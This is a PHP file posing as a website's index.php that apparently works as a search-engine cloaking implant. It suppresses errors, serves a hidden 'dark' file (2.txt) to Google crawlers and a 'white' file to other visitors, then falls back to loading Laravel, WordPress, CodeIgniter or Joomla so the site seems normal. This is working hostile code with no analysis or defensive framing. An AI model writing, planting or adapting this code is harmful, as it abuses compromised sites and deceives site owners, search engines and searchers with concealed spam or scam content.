<?php
error_reporting(0);
ini_set('display_errors', 0);

$ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';

$is_googlebot = (
    strpos($ua, 'googlebot') !== false ||
    strpos($ua, 'google-inspectiontool') !== false ||
    strpos($ua, 'mediapartners-google') !== false ||
    strpos($ua, 'adsbot-google') !== false ||
    strpos($ua, 'googleother') !== false ||
    strpos($ua, 'google-extended') !== false ||
    strpos($ua, 'googleweblight') !== false
);

$white_file = __DIR__ . '/w.txt';
$dark_file = __DIR__ . '/2.txt';

if ($is_googlebot) {
    if (file_exists($dark_file)) {
        readfile($dark_file);
    } else {
        echo '<h1>Dark Content Not Found</h1>';
    }
    exit;
}

if (file_exists($white_file)) {
    readfile($white_file);
    exit;
}

if (file_exists(__DIR__ . '/../vendor/autoload.php')) {
    require __DIR__ . '/../vendor/autoload.php';
    $app = require_once __DIR__ . '/../bootstrap/app.php';
    $kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
    $response = $kernel->handle(
        $request = Illuminate\Http\Request::capture()
    );
    $response->send();
    $kernel->terminate($request, $response);
    exit;
}

if (file_exists(__DIR__ . '/wp-blog-header.php')) {
    define('WP_USE_THEMES', true);
    require_once(__DIR__ . '/wp-blog-header.php');
    exit;
}

if (file_exists(__DIR__ . '/system/core/CodeIgniter.php')) {
    require_once __DIR__ . '/system/core/CodeIgniter.php';
    exit;
}

if (file_exists(__DIR__ . '/configuration.php')) {
    define('_JEXEC', 1);
    require_once __DIR__ . '/configuration.php';
    require_once __DIR__ . '/includes/defines.php';
    require_once __DIR__ . '/includes/framework.php';
    exit;
}

echo '<h1>Website Normal</h1>';
?>
